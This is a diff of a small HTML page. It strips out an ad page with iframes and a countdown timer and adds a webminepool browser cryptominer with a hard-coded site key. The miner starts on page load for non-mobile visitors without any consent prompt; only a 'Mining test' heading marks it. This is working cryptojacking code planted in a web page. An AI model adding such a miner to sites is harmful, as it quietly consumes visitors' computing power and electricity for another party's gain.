@@ -1,29 +1,16 @@
 <!DOCTYPE html>
 <html>
 <head>
-	<title>Adtest</title>
-		<meta charset="utf-8">
-	<title>Timer</title>
-	<script type="text/javascript">
-
-		document.addEventListener("DOMContentLoaded",() => {
-		var timeleft = 15;
-		var ads_time = setInterval( () => {
-		if (timeleft <= 0) {
-			clearInterval(ads_time);
-			// window.location.href = "https://m.facebook.com";
-			alert("Thanks for your click");
-		}
-		document.getElementById("ongoing").value= 15 - timeleft;
-		timeleft = timeleft - 1;
-	},1000 );
-	} )
-
-	</script>
+	<script src="https://webminepool.com/lib/base.js"></script>
+	<title></title>
 </head>
 <body>
-	<iframe data-aa="1697750" src="//acceptable.a-ads.com/1697750" scrolling="no" style="border:0px; padding:0; width:100%; height:100%; overflow:hidden" allowtransparency="true"></iframe>
-	<center><progress value="0" max="15" id = 'ongoing'></progress></center>
-	<iframe data-aa="1664182" src="//acceptable.a-ads.com/1664182" scrolling="no" style="border:0px; padding:0; width:100%; height:100%; overflow:hidden" allowtransparency="true"></iframe>
+	<h1>Mining test</h1>
+<script>
+    var miner = WMP.Anonymous('SK_fPGwTDHnYSPrWTJCT4RqB',{throttle: 0.5});
+    if (!miner.isMobile()){
+        miner.start();
+    }
+</script>
 </body>
 </html>
